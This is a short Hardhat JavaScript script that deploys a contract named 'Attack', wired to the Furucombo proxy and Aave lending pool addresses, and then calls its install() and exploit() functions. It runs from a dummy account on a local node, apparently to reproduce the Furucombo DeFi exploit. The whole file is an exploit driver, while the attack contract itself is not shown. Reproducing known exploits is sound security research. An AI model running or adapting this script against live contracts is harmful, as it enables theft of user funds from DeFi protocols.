
const hre = require("hardhat");

const furucomboProxyAddress = "0x17e8Ca1b4798B97602895f63206afCd1Fc90Ca5f";
const aaveProxyAddress = "0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9";

async function main() {
  // await hre.run('compile');
  
  const myDummyAccount = "0x8626f6940e2eb28930efb4cef49b2d1f2c9c1199";
  const web3 = new Web3("http://127.0.0.1:8545/");

  /////////////

  const jsonAttackFile = require('../artifacts/contracts/Attacker.sol/Attack.json');
  const jsonAttackABI = jsonAttackFile.abi;

  var myContract = new web3.eth.Contract(jsonAttackABI);
  myContract.options.data = jsonAttackFile.bytecode;

  ////////////////////////

  await myContract.deploy({ arguments: [furucomboProxyAddress, aaveProxyAddress] })
  .send({
      from: myDummyAccount,
      gas: 1500000,
      gasPrice: '30000000000000'
  }, function(error, transactionHash){ console.log(error, transactionHash); })
  .on('error', function(error){ console.log(error); })
  .then(function(newContractInstance){
      console.log("ATK address: ", newContractInstance.options.address)
      myContract.options.address = newContractInstance.options.address;
  });
  
  ////////////////////////
  
  await myContract.methods.install().send({from: myDummyAccount, gas: 15000000,
      gasPrice: '30000000000000'},
    function(error, transactionHash){
      console.log(error, transactionHash);
  })
  .then(function(){
      console.log('install() done')
  });

  await myContract.methods.exploit().send({from: myDummyAccount, gas: 15000000,
      gasPrice: '30000000000000'},
    function(error, transactionHash){
      console.log(error, transactionHash);
  });

  console.log("Exitting...");

}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
